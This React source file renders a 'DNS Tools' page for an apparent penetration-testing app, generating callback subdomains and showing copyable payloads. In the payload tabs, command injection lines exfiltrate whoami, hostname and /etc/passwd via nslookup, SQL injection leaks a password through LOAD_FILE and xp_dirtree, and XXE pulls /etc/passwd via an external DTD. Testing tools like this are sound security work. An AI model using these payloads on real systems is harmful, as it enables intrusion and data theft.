import { createFileRoute, Link } from '@tanstack/react-router';
import { useState } from 'react';
import { useQuery } from '@tanstack/react-query';
import { API_URL } from '@/lib/config';
import { apiFetch } from '@/lib/apiFetch';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Badge } from '@/components/ui/badge';
import {
  AlertCircle,
  Copy,
  RefreshCw,
  Wifi,
  Terminal,
  Code,
  Database,
  FileCode,
  Link as LinkIcon,
} from 'lucide-react';
import { toast } from 'sonner';

export const Route = createFileRoute('/security/dns')({
  component: DnsToolsPage,
});

// Types
interface DnsStatus {
  configured: boolean;
  enabled: boolean;
  running: boolean;
  nsConfigured: boolean;
  domain: string | null;
  responseIp: string | null;
}

function DnsToolsPage() {
  const [generatedSubdomain, setGeneratedSubdomain] = useState(
    () => localStorage.getItem('dns-subdomain') ?? ''
  );

  // Fetch DNS status
  const { data: status } = useQuery<DnsStatus>({
    queryKey: ['dns-status'],
    queryFn: async () => {
      const res = await apiFetch(`${API_URL}/api/settings/dns/status`);
      if (!res.ok) throw new Error('Failed to fetch DNS status');
      return res.json();
    },
    refetchInterval: 5000,
  });

  // Generate random subdomain
  const generateSubdomain = () => {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let token = '';
    for (let i = 0; i < 8; i++) {
      token += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    setGeneratedSubdomain(token);
    localStorage.setItem('dns-subdomain', token);
  };

  // Copy to clipboard
  const copyToClipboard = async (text: string, label: string) => {
    await navigator.clipboard.writeText(text);
    toast.success(`${label} copied to clipboard`);
  };

  // Not configured state
  if (!status?.configured) {
    return (
      <div className="container mx-auto py-12 px-4 sm:px-6">
        <Card className="max-w-2xl mx-auto">
          <CardHeader className="text-center">
            <div className="mx-auto mb-4 p-4 bg-muted rounded-full w-fit">
              <AlertCircle className="w-12 h-12 text-muted-foreground" />
            </div>
            <CardTitle>DNS Not Configured</CardTitle>
            <CardDescription>
              Configure DNS in Settings to use DNS-based testing tools
            </CardDescription>
          </CardHeader>
          <CardContent className="flex flex-col items-center gap-4">
            <Button asChild>
              <Link to="/settings">
                Go to Settings
              </Link>
            </Button>
            <p className="text-sm text-muted-foreground text-center">
              DNS tools allow you to generate unique subdomains for testing blind SSRF,
              data exfiltration, and out-of-band vulnerabilities.
            </p>
          </CardContent>
        </Card>
      </div>
    );
  }

  // Disabled state
  if (!status.enabled) {
    return (
      <div className="container mx-auto py-12 px-4 sm:px-6">
        <Alert className="max-w-2xl mx-auto">
          <Wifi className="h-4 w-4" />
          <AlertTitle>DNS Server Disabled</AlertTitle>
          <AlertDescription>
            Enable DNS in Settings to use this feature.{' '}
            <Link to="/settings" className="underline">
              Go to Settings
            </Link>
          </AlertDescription>
        </Alert>
      </div>
    );
  }

  const fullDomain = generatedSubdomain
    ? `${generatedSubdomain}.${status.domain}`
    : status.domain;

  return (
    <div className="container mx-auto py-6 px-4 sm:px-6 space-y-6 max-w-5xl">
      {/* Page Header */}
      <div>
        <h1 className="text-3xl font-bold">DNS Tools</h1>
        <p className="text-muted-foreground mt-1">
          Generate unique subdomains for blind vulnerability testing
        </p>
      </div>

      {/* Subdomain Generator Card */}
      <Card>
        <CardHeader>
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="p-2 bg-primary/10 rounded-lg">
                <Wifi className="w-5 h-5 text-primary" />
              </div>
              <div>
                <CardTitle>Subdomain Generator</CardTitle>
                <CardDescription>
                  Generate unique DNS subdomains for testing
                </CardDescription>
              </div>
            </div>
            <Badge variant="default" className="gap-1.5">
              <Wifi className="w-3 h-3" />
              DNS Active
            </Badge>
          </div>
        </CardHeader>
        <CardContent className="space-y-6">
          {/* Base Domain Display */}
          <div className="space-y-2">
            <Label>Base Domain</Label>
            <div className="flex gap-2">
              <Input
                value={status.domain || ''}
                readOnly
                className="font-mono text-sm"
              />
              <Button
                variant="outline"
                size="icon"
                onClick={() => copyToClipboard(status.domain || '', 'Base domain')}
              >
                <Copy className="w-4 h-4" />
              </Button>
            </div>
          </div>

          {/* Generated Subdomain */}
          <div className="space-y-2">
            <div className="flex items-center justify-between">
              <Label>Generated Subdomain</Label>
              <Button
                variant="outline"
                size="sm"
                onClick={generateSubdomain}
                className="gap-2"
              >
                <RefreshCw className="w-3 h-3" />
                Generate New
              </Button>
            </div>
            <div className="flex gap-2">
              <Input
                value={fullDomain || ''}
                readOnly
                className="font-mono text-sm"
                placeholder="Click 'Generate New' to create a subdomain"
              />
              <Button
                variant="outline"
                size="icon"
                onClick={() => copyToClipboard(fullDomain || '', 'Subdomain')}
                disabled={!generatedSubdomain}
              >
                <Copy className="w-4 h-4" />
              </Button>
            </div>
            <p className="text-xs text-muted-foreground">
              Use this unique subdomain in your payloads to detect blind vulnerabilities
            </p>
          </div>

          {/* Response IP */}
          {status.responseIp && (
            <div className="bg-muted p-3 rounded-lg">
              <p className="text-xs font-medium mb-1">DNS Response IP:</p>
              <code className="text-sm">{status.responseIp}</code>
            </div>
          )}
        </CardContent>
      </Card>

      {/* Payload Examples */}
      {generatedSubdomain && (
        <Card>
          <CardHeader>
            <div className="flex items-center gap-3">
              <div className="p-2 bg-primary/10 rounded-lg">
                <Code className="w-5 h-5 text-primary" />
              </div>
              <div>
                <CardTitle>Payload Examples</CardTitle>
                <CardDescription>
                  Copy these examples and modify for your testing
                </CardDescription>
              </div>
            </div>
          </CardHeader>
          <CardContent>
            <Tabs defaultValue="ssrf">
              <TabsList className="grid grid-cols-2 sm:grid-cols-4 w-full">
                <TabsTrigger value="ssrf" className="gap-2">
                  <LinkIcon className="w-3 h-3" />
                  SSRF
                </TabsTrigger>
                <TabsTrigger value="cmd" className="gap-2">
                  <Terminal className="w-3 h-3" />
                  Command
                </TabsTrigger>
                <TabsTrigger value="sql" className="gap-2">
                  <Database className="w-3 h-3" />
                  SQL
                </TabsTrigger>
                <TabsTrigger value="xxe" className="gap-2">
                  <FileCode className="w-3 h-3" />
                  XXE
                </TabsTrigger>
              </TabsList>

              {/* SSRF Tab */}
              <TabsContent value="ssrf" className="space-y-3">
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <Label className="text-xs text-muted-foreground">Simple SSRF Test</Label>
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() =>
                        copyToClipboard(`http://${fullDomain}`, 'SSRF payload')
                      }
                      className="h-6 gap-1"
                    >
                      <Copy className="w-3 h-3" />
                      Copy
                    </Button>
                  </div>
                  <pre className="bg-muted p-3 rounded text-xs overflow-x-auto">
                    {`http://${fullDomain}`}
                  </pre>
                </div>

                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <Label className="text-xs text-muted-foreground">
                      SSRF with URL Parameter
                    </Label>
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() =>
                        copyToClipboard(
                          `http://target.com/api?url=http://${fullDomain}`,
                          'SSRF payload'
                        )
                      }
                      className="h-6 gap-1"
                    >
                      <Copy className="w-3 h-3" />
                      Copy
                    </Button>
                  </div>
                  <pre className="bg-muted p-3 rounded text-xs overflow-x-auto">
                    {`http://target.com/api?url=http://${fullDomain}`}
                  </pre>
                </div>
              </TabsContent>

              {/* Command Injection Tab */}
              <TabsContent value="cmd" className="space-y-3">
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <Label className="text-xs text-muted-foreground">
                      Extract Current User
                    </Label>
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() =>
                        copyToClipboard(
                          `; nslookup $(whoami).${fullDomain}`,
                          'Command injection payload'
                        )
                      }
                      className="h-6 gap-1"
                    >
                      <Copy className="w-3 h-3" />
                      Copy
                    </Button>
                  </div>
                  <pre className="bg-muted p-3 rounded text-xs overflow-x-auto">
                    {`; nslookup $(whoami).${fullDomain}`}
                  </pre>
                </div>

                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <Label className="text-xs text-muted-foreground">
                      Extract Hostname
                    </Label>
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() =>
                        copyToClipboard(
                          `; nslookup $(hostname).${fullDomain}`,
                          'Command injection payload'
                        )
                      }
                      className="h-6 gap-1"
                    >
                      <Copy className="w-3 h-3" />
                      Copy
                    </Button>
                  </div>
                  <pre className="bg-muted p-3 rounded text-xs overflow-x-auto">
                    {`; nslookup $(hostname).${fullDomain}`}
                  </pre>
                </div>

                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <Label className="text-xs text-muted-foreground">
                      Extract File Contents (Base64)
                    </Label>
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() =>
                        copyToClipboard(
                          `; nslookup $(cat /etc/passwd | base64 | head -c 60).${fullDomain}`,
                          'Command injection payload'
                        )
                      }
                      className="h-6 gap-1"
                    >
                      <Copy className="w-3 h-3" />
                      Copy
                    </Button>
                  </div>
                  <pre className="bg-muted p-3 rounded text-xs overflow-x-auto">
                    {`; nslookup $(cat /etc/passwd | base64 | head -c 60).${fullDomain}`}
                  </pre>
                </div>
              </TabsContent>

              {/* SQL Injection Tab */}
              <TabsContent value="sql" className="space-y-3">
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <Label className="text-xs text-muted-foreground">
                      MySQL LOAD_FILE Exfiltration
                    </Label>
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() =>
                        copyToClipboard(
                          `' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.${fullDomain}\\\\\\\\abc')))--`,
                          'SQL injection payload'
                        )
                      }
                      className="h-6 gap-1"
                    >
                      <Copy className="w-3 h-3" />
                      Copy
                    </Button>
                  </div>
                  <pre className="bg-muted p-3 rounded text-xs overflow-x-auto">
                    {`' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',
  (SELECT password FROM users LIMIT 1),
  '.${fullDomain}\\\\\\\\abc')))--`}
                  </pre>
                </div>

                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <Label className="text-xs text-muted-foreground">
                      MSSQL xp_dirtree
                    </Label>
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() =>
                        copyToClipboard(
                          `'; EXEC master..xp_dirtree '\\\\\\\\${fullDomain}\\\\share'--`,
                          'SQL injection payload'
                        )
                      }
                      className="h-6 gap-1"
                    >
                      <Copy className="w-3 h-3" />
                      Copy
                    </Button>
                  </div>
                  <pre className="bg-muted p-3 rounded text-xs overflow-x-auto">
                    {`'; EXEC master..xp_dirtree '\\\\\\\\${fullDomain}\\\\share'--`}
                  </pre>
                </div>
              </TabsContent>

              {/* XXE Tab */}
              <TabsContent value="xxe" className="space-y-3">
                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <Label className="text-xs text-muted-foreground">
                      Basic XXE Out-of-Band
                    </Label>
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() =>
                        copyToClipboard(
                          `<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://${fullDomain}/xxe">
]>
<foo>&xxe;</foo>`,
                          'XXE payload'
                        )
                      }
                      className="h-6 gap-1"
                    >
                      <Copy className="w-3 h-3" />
                      Copy
                    </Button>
                  </div>
                  <pre className="bg-muted p-3 rounded text-xs overflow-x-auto">
                    {`<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://${fullDomain}/xxe">
]>
<foo>&xxe;</foo>`}
                  </pre>
                </div>

                <div className="space-y-2">
                  <div className="flex items-center justify-between">
                    <Label className="text-xs text-muted-foreground">
                      XXE with External DTD
                    </Label>
                    <Button
                      variant="ghost"
                      size="sm"
                      onClick={() =>
                        copyToClipboard(
                          `<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://${fullDomain}/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>`,
                          'XXE payload'
                        )
                      }
                      className="h-6 gap-1"
                    >
                      <Copy className="w-3 h-3" />
                      Copy
                    </Button>
                  </div>
                  <pre className="bg-muted p-3 rounded text-xs overflow-x-auto">
                    {`<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://${fullDomain}/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>`}
                  </pre>
                </div>
              </TabsContent>
            </Tabs>
          </CardContent>
        </Card>
      )}

      {/* Info Alert */}
      <Alert>
        <AlertCircle className="h-4 w-4" />
        <AlertTitle>How it works</AlertTitle>
        <AlertDescription className="text-sm space-y-2">
          <p>
            When you use these payloads in a vulnerable application, the target server will
            make a DNS query to your subdomain. This query will be logged in the Events page,
            confirming the vulnerability even when you can't see the HTTP response.
          </p>
          <p className="text-muted-foreground">
            For data exfiltration payloads, the extracted data will be encoded in the
            subdomain and captured in your DNS logs.
          </p>
        </AlertDescription>
      </Alert>
    </div>
  );
}
